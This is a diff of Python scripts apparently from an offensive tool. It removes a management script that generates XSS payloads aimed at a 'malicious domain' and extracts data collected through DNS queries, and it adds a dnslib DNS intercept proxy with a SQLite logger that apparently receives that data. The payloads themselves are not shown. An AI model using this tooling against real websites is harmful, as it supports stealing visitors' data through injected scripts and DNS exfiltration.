@@ -1,164 +1,121 @@
-import sqlite3, argparse, sys, os, time, subprocess, logging 
-import random, string
+# -*- coding: utf-8 -*-
 
-from payloads import payloads
+"""
+    InterceptResolver - proxy requests to upstream server 
+                        (optionally intercepting)
+        
+"""
+from __future__ import print_function
 
+import binascii,copy,socket,struct,sys,logging
 
-def getQueries(database):
-    conn = sqlite3.connect(database)
-    iq = """insert or replace into output select timestamp, ip, session,  group_concat(query,"") 
-                 from (
-                    select min(date) as timestamp, ip,  session,part, query 
-                    from queries group by session, part order by session, part
-                 ) group by session order by session, part;"""
-    conn.execute(iq)
-    q="select * from output order by timestamp"
-    result=conn.execute(q)
-    for row in result:
-	    print row
-    conn.close()
-    return
+from dnslib import DNSRecord,RR,QTYPE,RCODE,parse_time
+from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
+from dnslib.label import DNSLabel
+from dnslib.intercept import InterceptResolver
 
-def startDaemon(): 
-    print """Not implemented yet"""
-    return
+logging.basicConfig(filename='example.log',level=logging.DEBUG)
 
-def randomString():
-    """Generate a random string of fixed length """
-    length = random.randrange(4, 10)
-    letters = string.ascii_lowercase + string.digits
-    return ''.join(random.choice(letters) for i in range(length))
+if __name__ == '__main__':
 
-def getPid(pidfile):
-    pid = 0
-    try: 
-        f=open(pidfile,"r")
-        pid = int(f.read())
-        f.close()
-    except Exception, e:
-        logging.error("Error reading pid file")
+    import argparse,sys,time
 
-    return pid
-
-def writePid(pidfile, pid):
-    try:
-        f=open(pidfile,"w")
-        f.write(str(pid))
-        f.close()
-    except Exception, e: 
-        logging.error("Error writing pidfile")
-   
-
-def pidExists(pid):
-    if pid < 0: return False #NOTE: pid == 0 returns True
-    try:
-        os.kill(pid, 0) 
-    except Exception, e:  
-        return False
-    else:
-        return True # no error, we can send a signal to the process
-
-def killPid(pid):
-    if pid < 0: return False #NOTE: pid == 0 returns True
-    try:
-        os.kill(pid,15)
-    except Exception, e: 
-        logging.error("SIGTERM process id %d error:\n%s" % (pid, str(e)))
-        return False
-    else:
-        return True # no error, we can send a signal to the process 
-
-def __main__():
-    p = argparse.ArgumentParser(description="rascal management script")
-    l_grp = p.add_argument_group('List')
-    gp_grp = p.add_argument_group('Get Payload Code')
-    gd_grp = p.add_argument_group('Get Data Collected')
-    gd_grp.add_argument("-g",action="store_true", help="Get collected data")
-    gp_grp.add_argument("--code",action="store_true",help="Print XSS code with given variables")
-    l_grp.add_argument("-l","--list",action="store_true",help="List payloads available")
-    gp_grp.add_argument("-p","--payload",type=int,help="Payload ID to use",default=0)
-    gp_grp.add_argument("-d","--domain",
-        metavar="<domainname>",
-        help="Malicious domain used for the XSS attack")
-    gp_grp.add_argument("--maxchar",
-        metavar="<#linklabel_chars>",
-        default=40,
-        help="XSS: Max chars used on each <link> label injected")
-    gp_grp.add_argument("-s","--suffix",
-        metavar="<Session Suffix>",
-        help="String that will be concatenated the SESSION ID subdomain")
-    gd_grp.add_argument("--db",
-        metavar="<file>",
-        help="Database file")
-    #TODO: Group options and set dependencies
-    #TODO: manage the server easily
-    #p.add_argument("-i",help="zone reg",default="*.domain.local. IN A 127.0.0.1")
-    #p.add_argument("--start",action='store_true',help="Start DNS server")
-    #p.add_argument("--stop",action='store_true',help="Stop DNS server")
-    #p.add_argument("--log",help="Log file",default="./rascal.log")
-
+    p = argparse.ArgumentParser(description="DNS Intercept Proxy")
+    p.add_argument("--port","-p",type=int,default=53,
+                    metavar="<port>",
+                    help="Local proxy port (default:53)")
+    p.add_argument("--address","-a",default="",
+                    metavar="<address>",
+                    help="Local proxy listen address (default:all)")
+    p.add_argument("--upstream","-u",default="8.8.8.8:53",
+            metavar="<dns server:port>",
+                    help="Upstream DNS server:port (default:8.8.8.8:53)")
+    p.add_argument("--tcp",action='store_true',default=False,
+                    help="TCP proxy (default: UDP only)")
+    p.add_argument("--intercept","-i",action="append",
+                    metavar="<zone record>",
+                    help="Intercept requests matching zone record (glob) ('-' for stdin)")
+    p.add_argument("--domain","-d",
+                    help="Intercept requests matching specific domain and its subdomains")
+    p.add_argument("--resolve","-r",
+                    help="resolve with an specific IP")
+    p.add_argument("--skip","-s",action="append",
+                    metavar="<label>",
+                    help="Don't intercept matching label (glob)")
+    p.add_argument("--nxdomain","-x",action="append",
+                    metavar="<label>",
+                    help="Return NXDOMAIN (glob)")
+    p.add_argument("--ttl","-t",default="60s",
+                    metavar="<ttl>",
+                    help="Intercept TTL (default: 60s)")
+    p.add_argument("--timeout","-o",type=float,default=5,
+                    metavar="<timeout>",
+                    help="Upstream timeout (default: 5s)")
+    p.add_argument("--log",default="request,reply,truncated,error",
+                    help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
+    p.add_argument("--log-prefix",action='store_true',default=False,
+                    help="Log prefix (timestamp/handler/resolver) (default: False)")
+    p.add_argument("--db",
+                    help="SQLite DB file")
+    p.add_argument("--logger", default="bribonlogger",
+                    help="Logger class to impoert")
+    p.add_argument("--logfile", default="./server.log",
+                    help="Log file to write")
     args = p.parse_args()
 
-    pidfile = "./rascal.pid"
+    args.dns,_,args.dns_port = args.upstream.partition(':')
+    args.dns_port = int(args.dns_port or 53)
 
-    if args.g and not args.db:
-	p.print_help()
-        print("\nerror: --db options is needed")
-        sys.exit(1)
-    if not (args.g or args.code or args.list): 
-        p.print_help()
-        print("\nerror: Choose at least on of the -g, --code or -l parametres")
-        sys.exit(1)
+    resolver = InterceptResolver(args.dns,
+                                 args.dns_port,
+                                 args.ttl,
+                                 args.intercept or [],
+                                 args.skip or [],
+                                 args.nxdomain or [],
+                                 args.timeout)
 
-    if args.g and args.db:
-        getQueries(args.db)
-    if args.list:
-        print("Payloads:\n%s" % payloads)
-	sys.exit(0)
-    if args.code:
-        if args.domain:
-            domain=args.domain
-        else:
-            domain="DOMAIN"
-	
-        maxchar=str(args.maxchar)
-        payload=payloads[args.payload]
-        session_suffix=str(args.suffix)
-	
-	payload = payload.replace("%MAXCHAR%",maxchar)
-	payload = payload.replace("%DOMAIN%",domain)
-	payload = payload.replace("%SESSION_SUFFIX%",session_suffix)
-	payload = payload.replace("%DATASUBD%",randomString())
-	payload = payload.replace("%PARTSUBD%",randomString())
-        payload = payload.replace("%SESSIONSUBD%",randomString())
-        payload = payload.replace("%DOMAINSUBD%",randomString())
-        
-	print("Payload selected: \n")
-        print("  " + payload)
-    
 
-    """ TODO: Add easy server start parametre
-    if args.start:
+    logging.info("Starting Intercept Proxy (%s:%d -> %s:%d) [%s]" % (
+                        args.address or "*",args.port,
+                        args.dns,args.dns_port,
+                        "UDP/TCP" if args.tcp else "UDP"))
 
-        pid = getPid(pidfile)
-        if pid and pidExists(pid):
-            logging.error("Server is already up")
-            sys.exit(1)
-        else:
-            log=open(args.log,"a")
-	    logging.error("Openning the process...")
-	    p = subprocess.Popen(['python', './bribon.py','--db',args.db,'--domain',args.domain,'--logger','bribonlogger'],
-		     stdout=log, stderr=subprocess.STDOUT)
-        writePid(pidfile,p.pid)
+    for rr in resolver.zone:
+        print("    | ",rr[2].toZone(),sep="")
+    if resolver.nxdomain:
+        print("    NXDOMAIN:",", ".join(resolver.nxdomain))
+    if resolver.skip:
+        print("    Skipping:",", ".join(resolver.skip))
+    print()
 
-    if args.stop:
-        pid = getPid(pidfile)
-        if killPid(pid):
-            logging.info("Process terminated")
-            os.remove(pidfile)
-        else:
-            logging.error("Process id %d could not be stopped" % pid)
-      """  
- 
-if __name__ == '__main__':
-    __main__()
+    if args.logger:
+	Module = __import__(args.logger)
+        CustomLogger = getattr(Module, args.logger)
+        logger = CustomLogger(args.log,args.log_prefix,args.domain, args.db)
+    else:
+        logger = DNSLogger(args.log,args.log_prefix)
+
+    DNSHandler.log = { 
+        'log_request',      # DNS Request
+        'log_reply',        # DNS Response
+        'log_truncated',    # Truncated
+        'log_error',        # Decoding error
+    }
+
+    udp_server = DNSServer(resolver,
+                           port=args.port,
+                           address=args.address,
+                           logger=logger)
+    udp_server.start_thread()
+
+    if args.tcp:
+        tcp_server = DNSServer(resolver,
+                               port=args.port,
+                               address=args.address,
+                               tcp=True,
+                               logger=logger)
+        tcp_server.start_thread()
+
+    while udp_server.isAlive():
+        time.sleep(1)
+
